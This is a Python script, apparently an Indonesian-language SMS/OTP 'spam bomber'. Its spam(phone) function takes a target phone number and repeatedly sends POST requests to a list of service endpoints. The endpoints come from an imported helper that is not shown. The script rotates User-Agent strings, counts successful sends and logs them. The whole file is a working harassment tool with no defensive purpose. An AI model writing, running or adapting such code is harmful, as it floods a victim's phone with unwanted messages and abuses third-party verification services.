import os, sys, time
from datetime import datetime
from config import _x
from junk import G, C, Y, R, P, W, N, _u

def spam(phone):
    print(f"\n  {C}[*] Target : {phone}{N}")
    try:
        loop = int(input(f"  {C}[?] Loop (1-5): {N}").strip() or "1")
        if loop < 1: loop = 1
        if loop > 5: loop = 5
    except:
        loop = 1
    print(f"\n  {C}[*] Loop : {loop}x{N}\n")
    
    total_dc = 0
    total_el = 0
    
    for l in range(loop):
        if loop > 1:
            print(f"  {Y}--- Loop {l+1}/{loop} ---{N}")
        el = _x(phone)
        total_el = len(el)
        for name, url, h, b in el:
            h["User-Agent"] = _u()
            try:
                import requests as _rr
                rr = _rr.post(url, json=b, headers=h, timeout=15)
                if rr.status_code in (200, 201, 202): total_dc += 1
                with open(os.path.expanduser("~/umambo/log"), "a") as f:
                    f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {name} {rr.status_code}\n")
            except: pass
            sys.stdout.write(f"\r  {P}◧{N} Mengirim... ")
            sys.stdout.flush()
            time.sleep(1.5)
        sys.stdout.write("\r" + " " * 30 + "\r")
    
    print(f"  {G}✓ Dah tuh, puas?{N}")
    print(f"  {C}{total_dc}/{total_el * loop} terkirim{N}")
    input(f"\n  {W}[Enter] Kembali...{N}")
